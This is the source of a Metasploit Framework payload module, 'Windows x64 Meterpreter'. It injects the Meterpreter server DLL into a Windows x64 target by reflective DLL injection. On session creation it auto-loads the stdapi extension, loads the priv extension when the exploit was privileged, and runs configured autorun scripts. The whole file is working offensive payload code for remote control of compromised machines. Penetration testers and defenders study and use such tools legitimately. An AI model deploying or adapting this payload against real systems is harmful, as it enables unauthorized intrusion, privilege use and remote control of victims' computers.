##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/payload/windows/x64/reflectivedllinject'
require 'msf/base/sessions/meterpreter_x64_win'

###
#
# Injects the x64 meterpreter server DLL via the Reflective Dll Injection payload
#
###

module Metasploit3

	include Msf::Payload::Windows::ReflectiveDllInject_x64

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows x64 Meterpreter',
			'Version'       => '$Revision$',
			'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (Windows x64)',
			'Author'        => [ 'sf' ],
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::Meterpreter_x64_Win
		))

		register_advanced_options(
			[
				OptBool.new('AutoLoadStdapi', [true, "Automatically load the Stdapi extension", true]),
				OptString.new('InitialAutoRunScript', [false, "An initial script to run on session created (before AutoRunScript)", '']),
				OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", ''])
			], self.class)

		options.remove_option( 'LibraryName' )
		options.remove_option( 'DLL' )
	end

	def library_path
		File.join( Msf::Config.install_root, "data", "meterpreter", "metsrv.x64.dll" )
	end

	def on_session(session)
		super
		if (datastore['AutoLoadStdapi'] == true)
			session.load_stdapi
			if (framework.exploits.create(session.via_exploit).privileged?)
				session.load_priv
			end
		end
		if (datastore['InitialAutoRunScript'].empty? == false)
			client = session
			args = datastore['InitialAutoRunScript'].split
			print_status("Session ID #{session.sid} (#{session.tunnel_to_s}) processing InitialAutoRunScript '#{datastore['InitialAutoRunScript']}'")
			session.execute_script(args.shift, binding)
		end
		if (datastore['AutoRunScript'].empty? == false)
			client = session
			args = datastore['AutoRunScript'].split
			print_status("Session ID #{session.sid} (#{session.tunnel_to_s}) processing AutoRunScript '#{datastore['AutoRunScript']}'")
			session.execute_script(args.shift, binding)
		end
	end

end
